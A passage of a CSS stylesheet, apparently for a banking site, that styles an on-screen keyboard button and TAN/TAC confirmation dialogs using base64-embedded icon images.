Ny43NjcsMTYuMjAyeiIvPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMjAuMzAxLDE2LjIwMmgtMC44OTVjLTAuMjQ2LDAtMC40NDcsMC4yMDEtMC40NDcsMC40NDd2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2gwLjg5NQ0KCQljMC4yNDYsMCwwLjQ0Ni0wLjIwMSwwLjQ0Ni0wLjQ0N3YtMC44OTVDMTIwLjc0NywxNi40MDMsMTIwLjU0NywxNi4yMDIsMTIwLjMwMSwxNi4yMDJ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMi44MzMsMTYuMjAyaC0wLjg5NWMtMC4yNDYsMC0wLjQ0NiwwLjIwMS0wLjQ0NiwwLjQ0N3YwLjg5NWMwLDAuMjQ2LDAuMiwwLjQ0NywwLjQ0NiwwLjQ0N2gwLjg5NQ0KCQljMC4yNDYsMCwwLjQ0Ny0wLjIwMSwwLjQ0Ny0wLjQ0N3YtMC44OTVDMTIzLjI4LDE2LjQwMywxMjMuMDc5LDE2LjIwMiwxMjIuODMzLDE2LjIwMnoiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMTEwLjE2NywxOC43MzZoLTAuODk0Yy0wLjI0NiwwLTAuNDQ2LDAuMi0wLjQ0NiwwLjQ0NnYwLjg5NWMwLDAuMjQ2LDAuMiwwLjQ0NywwLjQ0NiwwLjQ0N2gwLjg5NA0KCQljMC4yNDYsMCwwLjQ0OC0wLjIwMSwwLjQ0OC0wLjQ0N3YtMC44OTVDMTEwLjYxNSwxOC45MzcsMTEwLjQxMywxOC43MzYsMTEwLjE2NywxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExMS44MDcsMjAuNTI0aDAuODk0YzAuMjQ3LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1YzAtMC4yNDYtMC4yLTAuNDQ3LTAuNDQ3LTAuNDQ3aC0wLjg5NA0KCQljLTAuMjQ2LDAtMC40NDcsMC4yMDEtMC40NDcsMC40NDd2MC44OTVDMTExLjM1OSwyMC4zMjMsMTExLjU2MSwyMC41MjQsMTExLjgwNywyMC41MjR6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNC4zNCwyMC41MjRoMC44OTRjMC4yNDYsMCwwLjQ0OC0wLjIwMSwwLjQ0OC0wLjQ0N3YtMC44OTVjMC0wLjI0Ni0wLjIwMi0wLjQ0Ny0wLjQ0OC0wLjQ0N2gtMC44OTQNCgkJYy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1QzExMy44OTMsMjAuMzIzLDExNC4wOTQsMjAuNTI0LDExNC4zNCwyMC41MjR6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNy43NjcsMTguNzM2aC0wLjg5NGMtMC4yNDYsMC0wLjQ0NywwLjItMC40NDcsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2gwLjg5NA0KCQljMC4yNDYsMCwwLjQ0Ny0wLjIwMSwwLjQ0Ny0wLjQ0N3YtMC44OTVDMTE4LjIxNCwxOC45MzcsMTE4LjAxMywxOC43MzYsMTE3Ljc2NywxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMC4zMDEsMTguNzM2aC0wLjg5NWMtMC4yNDYsMC0wLjQ0NywwLjItMC40NDcsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2gwLjg5NQ0KCQljMC4yNDYsMCwwLjQ0Ni0wLjIwMSwwLjQ0Ni0wLjQ0N3YtMC44OTVDMTIwLjc0NywxOC45MzcsMTIwLjU0NywxOC43MzYsMTIwLjMwMSwxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMi44MzMsMTguNzM2aC0wLjg5NWMtMC4yNDYsMC0wLjQ0NiwwLjItMC40NDYsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIsMC40NDcsMC40NDYsMC40NDdoMC44OTUNCgkJYzAuMjQ2LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1QzEyMy4yOCwxOC45MzcsMTIzLjA3OSwxOC43MzYsMTIyLjgzMywxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExMC4xNjcsMjEuMjdoLTAuODk0Yy0wLjI0NiwwLTAuNDQ2LDAuMjAxLTAuNDQ2LDAuNDQ2djAuODk1YzAsMC4yNDYsMC4yLDAuNDQ3LDAuNDQ2LDAuNDQ3aDAuODk0DQoJCWMwLjI0NiwwLDAuNDQ4LTAuMjAxLDAuNDQ4LTAuNDQ3di0wLjg5NUMxMTAuNjE1LDIxLjQ3MSwxMTAuNDEzLDIxLjI3LDExMC4xNjcsMjEuMjd6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNy43NjcsMjEuMjdoLTUuOTZjLTAuMjQ2LDAtMC40NDcsMC4yMDEtMC40NDcsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2g1Ljk2DQoJCWMwLjI0NiwwLDAuNDQ3LTAuMjAxLDAuNDQ3LTAuNDQ3di0wLjg5NUMxMTguMjE0LDIxLjQ3MSwxMTguMDEzLDIxLjI3LDExNy43NjcsMjEuMjd6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMC4zMDEsMjEuMjdoLTAuODk1Yy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ2djAuODk1YzAsMC4yNDYsMC4yMDEsMC40NDcsMC40NDcsMC40NDdoMC44OTUNCgkJYzAuMjQ2LDAsMC40NDYtMC4yMDEsMC40NDYtMC40NDd2LTAuODk1QzEyMC43NDcsMjEuNDcxLDEyMC41NDcsMjEuMjcsMTIwLjMwMSwyMS4yN3oiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMTIyLjgzMywyMS4yN2gtMC44OTVjLTAuMjQ2LDAtMC40NDYsMC4yMDEtMC40NDYsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIsMC40NDcsMC40NDYsMC40NDdoMC44OTUNCgkJYzAuMjQ2LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1QzEyMy4yOCwyMS40NzEsMTIzLjA3OSwyMS4yNywxMjIuODMzLDIxLjI3eiIvPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMjMuNTg1LDE0LjA3aC0xNS4wNjNjLTEuMjksMC0yLjMzOSwxLjA0OS0yLjMzOSwyLjM0djYuNDM5YzAsMS4yOSwxLjA0OSwyLjM0MSwyLjMzOSwyLjM0MWgxNS4wNjMNCgkJYzEuMjksMCwyLjMzOS0xLjA1MSwyLjMzOS0yLjM0MVYxNi40MUMxMjUuOTI0LDE1LjExOSwxMjQuODc1LDE0LjA3LDEyMy41ODUsMTQuMDd6IE0xMjQuNTUsMTYuNTR2Ni4xOA0KCQljMCwwLjc0MS0wLjYwNCwxLjM0My0xLjM0NCwxLjM0M2gtMTQuMzA1Yy0wLjc0MSwwLTEuMzQ0LTAuNjAyLTEuMzQ0LTEuMzQzdi02LjE4YzAtMC43NCwwLjYwMy0xLjM0MywxLjM0NC0xLjM0M2gxNC4zMDUNCgkJQzEyMy45NDYsMTUuMTk3LDEyNC41NSwxNS44LDEyNC41NSwxNi41NHoiLz4NCjwvZz4NCjwvc3ZnPg0K);  
    background-position: -102px -10px;
    display: inline-block;
    cursor:pointer;
}
html.oldie a.openkeyboard.inInput:after{
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKMAAAAbCAYAAAAQ9T+YAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAABYhJREFUeNrsm71y4joUgL2Z9Ov7BOuUt3Nm6NeUVMATBJ4AUlMYitTAE+B9gnirlHb6zCy32jLkDbxPkHtOfJQIRbKPjcwuG58ZDeAfSZY+nT8Zx2mllVZaaWVfPnEvfPj5FMBHIB2KOv9+2R2jk9C2R217dCiDkkL723YKPxCMAIILH7cKiEJWAMR1gxBi20soI8MlKZTrxqDszbDdPhRfWgiviwHKdyixc3eTtSgdB8bEAKKQBcAwbwjEhEAoEgShaxXIHEJcBC7jamx/DUDOW5wahBGAQBB+lE0GgPBPAzCiNh5oNKFDgMqg7KAPFxYgxDo3mnY5gouh22rJ+nJWcp6jGdwGQPQUIHCCLwE41IBd+H5Bky/Eg3tGFkBMCkDMCDZcwJf0Wxb/5f68nlYagPF3iQrEUDbD8D0HY1/6B7Z5W+ISRABirpnvbrAvOl/ZJ6BbaQBGn1MJmXObsqddAL5UvYCATK1o6NxHDCz13Yf6Wv+xARivmPVcnfg4LBnXTAGyKcE7KLln0ppr+zB6zHq8kx2BXCu6bGh7s2cy6W6JZh+1eFWT85LzC4bWyFMbdmWnmOCiCFb3vYr0Gc8XQ3mC8pkg48CL1mLVIsYXTp7xtiTVgUnn0x303uyxQLNj0DLWRN2PLCDzyLsVizCiJtgUXHJhY1uQ0U4Vwa3KMRPG54KzQjvf7yW1e7OyjYDXsYH7di1mML+UZei8z4KwzTRGrRGAEhq0h839aZtBEII9tlDPoRG2Ry6HbvF5ztt+O0K/pQzB3wjia7YCv3fQ4tSBUfLhdDA+fZCFfa/85qayMgOEGwV0XOwZnFsXba2S9eBuU5bN5/AYL5o85H0N5WeFY3FHMzZcGE0P//nIUMQ0wQPH3s5Pxqgrlky0z247T47LMImkuGsY4xCu+VLgYohgcmzSuAzxqR5cEJdHmLOposg8OvZu0Z0VrEIXyhTKY4EmwPPJwVtxPMGVPKSJ6uq0Tk1JS2Hdh4q7b701wORKmYqIoJLhG8F4DgqUQkTPnkhgiVRTQtmBiXJsQiWh500raPdDtKJH7eb+c15QJg8aS3umgdCHsqGIcemU5xDR3GwQWihzMkO2Bf2pWPJjt47B76gh39laMZevdSAnrRhofErhV8aK2TbJL82cuBLknubY75JQ9KGDL7O8aXNX94zn0mANiOK6TrtHDaCpQVDWFn0SXCCu4uAHluqOS/ywp5pBjZp7HWgm6gVa3O6E51tW8Ekj6m8q+fOx8nmvOfbfAea9qlYMnOLE/wiu+daRFu05gbgkO24zmkVzM5Q12oGSCB+H+mvHzOArX73ZukQbqfC6JWCumCkdnIgxWaIqzzOV+hsq2uar1DfdsdQ5joQaOHeaa1JVM04b6tBEY+Zqa8ca0SwXyDkA2TfU24dzq9f3FO9uhvDbI5/MFKkuOJE1aavHmtpcwJxJvqTsq94bjh0jgh4ZFqrqXgRyquec/tvSlATO6UjX0e+s5C8Y92Yx+Wv9gsWAYAwNL9jGzvut1W+ktYISP9XkEmE7V9SfUNOXLR1fSRYrahhEt4KV2Uv1nJ0QLGien7E0AnkO0IVBc3iSafQLNGJXTedIQddOA9nOoDHXDBiFafYKIm9XCZSOEdRMDX1KHP27nmJs2XnGjyG5/9hVfDKOrF5Mc/lfDsY0+AJo3fbnWPf+pqTtUBPi+wBiK3fOCHYcJVD1mwhklFSOKgvqv+7FG0z1RH8SjNkfUVcOFPqQEUXAVwZtuCWfbc3df8ZsAMAgYJ8oWgrrWhSAiHJNAN9CPYeOTxP/6gwNmhfTOnMCdmJITYWfKP+1bIow+s8KxwQLP8izAOK6ZFKry9vOS2YyxTXcDlEne1+axunQMbK+D07RclJiPQqD5f8FGABmtv4JiRaZKgAAAABJRU5ErkJggg==);
}

a.openkeyboard.inInput{
    display:block;
    z-index:1;
    position:absolute;
    right:20px;
    top:12px;
}
a.openkeyboard.inInput.hidden {
    display:none;
}
/************************************************************************
* svg + png logos as H1 background  - 1.9.2014
************************************************************************/  

/**
 * FEDLOG-1929
 * Auskommentiert 2018.06.26
 *
h1.logo{
    text-indent:-99999px;
    width:90%;
    height:auto;
    min-height:42px;
    background-repeat:no-repeat;
    background-position:0 0;
}
 */

/************************************************************************
* TAC Form and TAC FORM Page  - 2.9.2014
* TAN Form and TAN Form Page
************************************************************************/ 
 
body.tac > .overlay,
body.tan > .overlay,
body.cardtan > .overlay,
body.heureka > .overlay{
    background:rgba(0,0,0,0.5);
    width:100%;
    height:100%;
    position:absolute;
    top:0;
    left:0;
    bottom:0;
    right:0;
    display:block;
    z-index:-1;
}

body.tac > .wrapper,
body.tan > .wrapper,
body.cardtan > .wrapper,
body.heureka > .wrapper{
    padding:0;
    background-color:#fff;
    width:60%;
    -webkit-box-shadow: 0px 0px 10px 6px rgba(0, 0, 0, 0.35); /* WebKit */
    -moz-box-shadow: 0px 0px 10px 6px rgba(0, 0, 0, 0.35); /* Firefox */
    box-shadow: 0px 0px 10px 6px rgba(0, 0, 0, 0.35); /* Standard */
    padding-bottom:2.5rem;
}
.TACdialog h1,
.TANdialog h1,
.cardTANdialog h1,
.Heurekadialog h1{
    margin:0;
    background:#aabacc;
    color:#fff;
    padding:1rem 2rem;
    font-size:1.6rem;
    font-weight:400;
}
.removewhite{
    display: inline-block;
    background-size: contain;
    background-repeat: no-repeat;
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAaCAYAAACpSkzOAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAATtJREFUeNq8VgsNgzAQHSjAwZCAhErAwZgD5gAHk9A56BywKaiE4QAJ3TUBQqD3KbC95ELCNbze6+txyUkA51wBDwVxhihmqTdEB/FKkqQ7bQUQVBAfJ4OBULEEBYR12+AJM2kVvdsHO8hNkhwFv9kck6t3x8KGiFr3GzRSybzeGYRG8hWjRj+Zg6jGzh0UIKuE0jd+QU5UowIS6yXJLNegZyWRDekUUWaidkGSxTo2FTQKv/sWIxuqayHIzaTCrjQ21RAuHEkM0RW68zOUgPc3eDwkvY07o0rYiDX1Eb9AEfkaOXiDuNGgRMMCzDEl4a6VGwkiw5Xdj3cGsfBExkhXjkQ50+7vRNWWkmzVwQWm2Ar1j19Fg1k02zErLKG5+5AxmktQx0xCZcSoNaIlhxLBVGQYV2pupvsKMABpAXzjVcyKaQAAAABJRU5ErkJggg==);
    background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNS4xLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSINCgkgaWQ9InN2ZzMwMTMiIHNvZGlwb2RpOmRvY25hbWU9InJlbW92ZV9zaWduX2ZvbnRfYXdlc29tZS5zdmciIGlua3NjYXBlOnZlcnNpb249IjAuNDguMy4xIHI5ODg2IiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnN2Zz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOmNjPSJodHRwOi8vY3JlYXRpdmVjb21tb25zLm9yZy9ucyMiIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyIgeG1sbnM6c29kaXBvZGk9Imh0dHA6Ly9zb2RpcG9kaS5zb3VyY2Vmb3JnZS5uZXQvRFREL3NvZGlwb2RpLTAuZHRkIiB4bWxuczppbmtzY2FwZT0iaHR0cDovL3d3dy5pbmtzY2FwZS5vcmcvbmFtZXNwYWNlcy9pbmtzY2FwZSINCgkgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgeD0iMHB4IiB5PSIwcHgiIHdpZHRoPSIyNS43MTVweCINCgkgaGVpZ2h0PSIyNS43MTVweCIgdmlld0JveD0iMi4yODcgLTI1My42MzkgMjUuNzE1IDI1LjcxNSIgZW5hYmxlLWJhY2tncm91bmQ9Im5ldyAyLjI4NyAtMjUzLjYzOSAyNS43MTUgMjUuNzE1Ig0KCSB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxzb2RpcG9kaTpuYW1lZHZpZXcgIGlkPSJuYW1lZHZpZXczMDE5IiBpbmtzY2FwZTpwYWdlb3BhY2l0eT0iMCIgaW5rc2NhcGU6cGFnZXNoYWRvdz0iMiIgaW5rc2NhcGU6d2luZG93LXdpZHRoPSI2NDAiIGlua3NjYXBlOndpbmRvdy1oZWlnaHQ9IjQ4MCIgaW5rc2NhcGU6d2luZG93LXg9IjAiIGlua3NjYXBlOndpbmRvdy15PSIyNSIgaW5rc2NhcGU6Y3VycmVudC1sYXllcj0ic3ZnMzAxMyIgaW5rc2NhcGU6d2luZG93LW1heGltaXplZD0iMCIgaW5rc2NhcGU6Y3k9Ijg5NiIgaW5rc2NhcGU6Y3g9Ijg5NiIgZ3JpZHRvbGVyYW5jZT0iMTAiIHBhZ2Vjb2xvcj0iI2ZmZmZmZiIgb2JqZWN0dG9sZXJhbmNlPSIxMCIgZ3VpZGV0b2xlcmFuY2U9IjEwIiBib3JkZXJjb2xvcj0iIzY2NjY2NiIgc2hvd2dyaWQ9ImZhbHNlIiBib3JkZXJvcGFjaXR5PSIxIiBpbmtzY2FwZTp6b29tPSIwLjEzMTY5NjQzIj4NCgk8L3NvZGlwb2RpOm5hbWVkdmlldz4NCjxnIGlkPSJnMzAxNSIgdHJhbnNmb3JtPSJtYXRyaXgoMSwwLDAsLTEsMTM2LjY3Nzk3LDEyOTMuMDE2OSkiPg0KCTxwYXRoIGlkPSJwYXRoMzAxNyIgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgZmlsbD0iI0ZGRkZGRiIgZD0iTS0xMTUuMTU1LDE1MzAuMDE1YzAsMC4yOS0wLjEwNCwwLjU0Mi0wLjMxNywwLjc1NA0KCQlsLTMuMDI5LDMuMDI5bDMuMDI5LDMuMDNjMC4yMTMsMC4yMTIsMC4zMTcsMC40NjMsMC4zMTcsMC43NTNjMCwwLjMwMS0wLjEwNCwwLjU1OS0wLjMxNywwLjc3MWwtMS41MDcsMS41MDcNCgkJYy0wLjIxMywwLjIxMi0wLjQ2OSwwLjMxNy0wLjc3MSwwLjMxN2MtMC4yOSwwLTAuNTQxLTAuMTA1LTAuNzUzLTAuMzE3bC0zLjAzLTMuMDNsLTMuMDMsMy4wMw0KCQljLTAuMjEyLDAuMjEyLTAuNDYzLDAuMzE3LTAuNzUzLDAuMzE3Yy0wLjMwMSwwLTAuNTU4LTAuMTA1LTAuNzctMC4zMTdsLTEuNTA3LTEuNTA3Yy0wLjIxMi0wLjIxMi0wLjMxOC0wLjQ3LTAuMzE4LTAuNzcxDQoJCWMwLTAuMjksMC4xMDYtMC41NDEsMC4zMTgtMC43NTNsMy4wMjktMy4wM2wtMy4wMjktMy4wMjljLTAuMjEyLTAuMjEzLTAuMzE4LTAuNDY0LTAuMzE4LTAuNzU0YzAtMC4zMDEsMC4xMDYtMC41NTgsMC4zMTgtMC43Nw0KCQlsMS41MDctMS41MDdjMC4yMTItMC4yMTIsMC40NjktMC4zMTgsMC43Ny0wLjMxOGMwLjI5LDAsMC41NDIsMC4xMDYsMC43NTMsMC4zMThsMy4wMywzLjAzbDMuMDMtMy4wMw0KCQljMC4yMTItMC4yMTIsMC40NjMtMC4zMTgsMC43NTMtMC4zMThjMC4zMDIsMCwwLjU1OCwwLjEwNiwwLjc3MSwwLjMxOGwxLjUwNywxLjUwNw0KCQlDLTExNS4yNiwxNTI5LjQ1Ny0xMTUuMTU1LDE1MjkuNzE0LTExNS4xNTUsMTUzMC4wMTV6IE0tMTA4LjY3NiwxNTMzLjc5OWMwLTIuMzMzLTAuNTc0LTQuNDgzLTEuNzI1LTYuNDU0DQoJCWMtMS4xNDgtMS45Ny0yLjcxLTMuNTI5LTQuNjc5LTQuNjc5Yy0xLjk3MS0xLjE1LTQuMTIxLTEuNzI1LTYuNDU0LTEuNzI1cy00LjQ4MywwLjU3NC02LjQ1NCwxLjcyNQ0KCQljLTEuOTcsMS4xNDktMy41MjgsMi43MDktNC42NzksNC42NzljLTEuMTUsMS45NzEtMS43MjUsNC4xMjEtMS43MjUsNi40NTRzMC41NzQsNC40ODQsMS43MjUsNi40NTQNCgkJYzEuMTQ5LDEuOTcsMi43MDksMy41MjksNC42NzksNC42NzljMS45NzEsMS4xNDksNC4xMjEsMS43MjUsNi40NTQsMS43MjVzNC40ODMtMC41NzUsNi40NTQtMS43MjUNCgkJYzEuOTY5LTEuMTQ5LDMuNTI5LTIuNzA5LDQuNjc5LTQuNjc5Qy0xMDkuMjUsMTUzOC4yODMtMTA4LjY3NiwxNTM2LjEzMi0xMDguNjc2LDE1MzMuNzk5eiIvPg0KPC9nPg0KPC9zdmc+DQo=);
    float: right;
    padding-right:26px;
    background-position:center right;
    font-size:0.9rem;
    color:#fff;
    text-decoration:none;
}
.TACdialog > *,
.TANdialog > *,
.cardTANdialog > *,
.Heurekadialog > *{
    margin: 1rem 2rem;
}
.TACdialog select option{
    -webkit-appearance: menulist;
    padding:0;
    font-family: 'open_sansregular',Arial,sans-serif;
    font-size:1rem;
}
.TACdialog form,
.TANdialog form,
.cardTANdialog form,
.Heurekadialog form{
    margin:0;
    background:#e6ebf0;
    padding:1rem 2rem;
    text-align:center;
}
.TACdialog select,
.TACdialog input[type=number],
.cardTANdialog input[type=number],
.TANdialog input[type=number]{
    -webkit-appearance: menulist;
    padding:.3rem .5rem; 
    font-family: 'open_sansregular',Arial,sans-serif;
    font-size:1rem;
    margin-left:1rem;
    border:solid 1px #aabacc;
    border-radius:4px;
}
.TACdialog input[type=number],
.TANdialog input[type=number],
.cardTANdialog input[type=number]{
    -webkit-appearance: none;
    -moz-appearance:textfield;
}
.TACdialog .button,
.TANdialog .button,
.cardTANdialog .button,
.Heurekadialog .button{
    background: #0d5487;
    border: none;
    outline: none;
    color: #fff;
    border-radius: 3px;
    font-family: 'open_sansregular',Arial,sans-serif;
    font-size:1rem;
    padding:.5rem 1.5rem;
    margin-left:1rem;
    cursor:pointer;
}
.TACdialog .error,
.TANdialog .error,
.cardTANdialog .error{
    display: none;
}
body.error .TACdialog .error,
body.error .TANdialog .error,
body.error .cardTANdialog .error{
    background:#F9D2D2;
    border-radius: 3px;
    font-family: 'open_sansregular',Arial,sans-serif;
    font-size:1rem;
    padding:.5rem 1.5rem;
    margin-left:1rem;
    color:#9e0000;
    text-align:center;
    display: block;
}
.TACdialog .passed,
.TANdialog .passed,
.cardTANdialog .passed,
.Heurekadialog .passed{
    text-align:center;
    color:#19CE2E;
    font-size:1.3rem;
    margin-top:4rem;
    padding-top:3rem;
    padding-bottom:2rem;
    position:relative;
}
.TACdialog .passed:before,
.TANdialog .passed:before,
.cardTANdialog .passed:before,
.Heurekadialog .passed:before{
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAaCAYAAACpSkzOAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAXNJREFUeNq0lstxwjAQhmUNBfjKKU4DiaCCUEGSCoIryFABpAKgAkMHdIDTQMaTCnzLlXSQ3bBiFLOyXs4/syPARp/2IWkz4aHxx10BwwMYjjc0NmDfYPXX9LN2zZE5AHMYXsGUY54T2AHsDaCtNwgAOHHlAeCEsJUTRF6swXIRLwzrDIAnFkSQSgyjPzDZCddaDCdlLloaD6rEcHF6oiidQfRFif/R0vRoOcCEO7BnKnVTBToyotwUqRBIeknRwX107KThUdKOHwSCgs9YbWU3Vwi6DwyFFUIe5VwqRpawuULRBzlyhSW5jcaEYtbxLAhiAyld+xZYMESD3pnfKwtsEgPRoNbyjIO1MRBkIKjv0rqCRUBQtaRVHkJggRDUXhfD1vHiBRYB+b3qM2OVeHrPHX9agL0EHsBYQE2WEA4fLQCy4W5YZTkFks9AyeyVW7qGUz0pvdot8G5FrVaIdzVBmtC+LqcC6SsA3dPt+xrJHwEGANecrLHT1gYWAAAAAElFTkSuQmCC);
    background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNS4xLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSINCgkgaWQ9InN2ZzMwMTMiIHNvZGlwb2RpOmRvY25hbWU9Im9rX3NpZ25fZm9udF9hd2Vzb21lLnN2ZyIgaW5rc2NhcGU6dmVyc2lvbj0iMC40OC4zLjEgcjk4ODYiIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6c3ZnPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6Y2M9Imh0dHA6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL25zIyIgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIiB4bWxuczpzb2RpcG9kaT0iaHR0cDovL3NvZGlwb2RpLnNvdXJjZWZvcmdlLm5ldC9EVEQvc29kaXBvZGktMC5kdGQiIHhtbG5zOmlua3NjYXBlPSJodHRwOi8vd3d3Lmlua3NjYXBlLm9yZy9uYW1lc3BhY2VzL2lua3NjYXBlIg0KCSB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB4PSIwcHgiIHk9IjBweCIgd2lkdGg9IjI1LjcxNHB4Ig0KCSBoZWlnaHQ9IjI1LjcxNHB4IiB2aWV3Qm94PSIxLjkwNyAtMjU0LjAyMSAyNS43MTQgMjUuNzE0IiBlbmFibGUtYmFja2dyb3VuZD0ibmV3IDEuOTA3IC0yNTQuMDIxIDI1LjcxNCAyNS43MTQiDQoJIHhtbDpzcGFjZT0icHJlc2VydmUiPg0KPHNvZGlwb2RpOm5hbWVkdmlldyAgaWQ9Im5hbWVkdmlldzMwMTkiIGlua3NjYXBlOnBhZ2VvcGFjaXR5PSIwIiBpbmtzY2FwZTpwYWdlc2hhZG93PSIyIiBpbmtzY2FwZTp3aW5kb3ctd2lkdGg9IjY0MCIgaW5rc2NhcGU6d2luZG93LWhlaWdodD0iNDgwIiBpbmtzY2FwZTp3aW5kb3cteD0iMCIgaW5rc2NhcGU6d2luZG93LXk9IjI1IiBpbmtzY2FwZTpjdXJyZW50LWxheWVyPSJzdmczMDEzIiBpbmtzY2FwZTp3aW5kb3ctbWF4aW1pemVkPSIwIiBpbmtzY2FwZTpjeT0iODk2IiBpbmtzY2FwZTpjeD0iODk2IiBncmlkdG9sZXJhbmNlPSIxMCIgcGFnZWNvbG9yPSIjZmZmZmZmIiBvYmplY3R0b2xlcmFuY2U9IjEwIiBndWlkZXRvbGVyYW5jZT0iMTAiIGJvcmRlcmNvbG9yPSIjNjY2NjY2IiBzaG93Z3JpZD0iZmFsc2UiIGJvcmRlcm9wYWNpdHk9IjEiIGlua3NjYXBlOnpvb209IjAuMTMxNjk2NDMiPg0KCTwvc29kaXBvZGk6bmFtZWR2aWV3Pg0KPGcgaWQ9ImczMDE1IiB0cmFuc2Zvcm09Im1hdHJpeCgxLDAsMCwtMSwxMTMuODk4MzEsMTI3MC4yMzczKSI+DQoJPHBhdGggaWQ9InBhdGgzMDE3IiBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBmaWxsPSIjMTlDRTJFIiBkPSJNLTkwLjQ5NiwxNTE0LjExM2MwLDAuMzEzLTAuMTAxLDAuNTY5LTAuMzAxLDAuNzcNCgkJbC0xLjUyMywxLjUwN2MtMC4yMTMsMC4yMTItMC40NjQsMC4zMTgtMC43NTQsMC4zMThzLTAuNTQxLTAuMTA2LTAuNzU0LTAuMzE4bC02LjgzLTYuODEzbC0zLjc4NCwzLjc4Mw0KCQljLTAuMjEyLDAuMjEyLTAuNDYzLDAuMzE4LTAuNzUzLDAuMzE4cy0wLjU0MS0wLjEwNi0wLjc1My0wLjMxOGwtMS41MjMtMS41MDZjLTAuMjAxLTAuMjAxLTAuMzAxLTAuNDU4LTAuMzAxLTAuNzcxDQoJCWMwLTAuMzAxLDAuMTAxLTAuNTUyLDAuMzAxLTAuNzUzbDYuMDYxLTYuMDYxYzAuMjEyLTAuMjEyLDAuNDYzLTAuMzE4LDAuNzUzLTAuMzE4YzAuMzAxLDAsMC41NTgsMC4xMDYsMC43NywwLjMxOGw5LjA5MSw5LjA5DQoJCUMtOTAuNTk3LDE1MTMuNTYxL